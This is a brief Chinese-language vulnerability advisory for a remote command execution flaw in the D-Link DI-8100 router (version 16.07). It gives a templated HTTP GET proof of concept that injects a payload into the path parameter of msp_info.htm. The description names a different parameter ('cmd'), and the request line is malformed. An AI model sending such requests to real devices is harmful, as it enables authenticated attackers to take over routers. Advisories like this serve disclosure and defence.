# upgrade_filter.asp 命令执行

>   D-Link DI-8100是D-Link专为中小型网络环境设计的宽带路由器，支持最多4个互联网端口和最多4个局域网端口。

## 来源

[https://github.com/aLtEr6/pdf](https://github.com/aLtEr6/pdf)

## 简介

D-Link DI-8100的upgrade_filter.asp接口存在远程命令执行漏洞，由于msp_info.htm的对cmd参数未做过滤处理，获取登录权限的攻击者可通过构造请求执行任意命令，进而接管该服务器。

## 漏洞类型

远程命令执行

## 影响范围

-   D-LINK DI-8100 16.07

## POC

```http
GET /msp_info.htm?path={{payload}}&name=file.bin&time=1111 /1.1
Host: {{Host}}
Cookie: {{Cookie}}
```

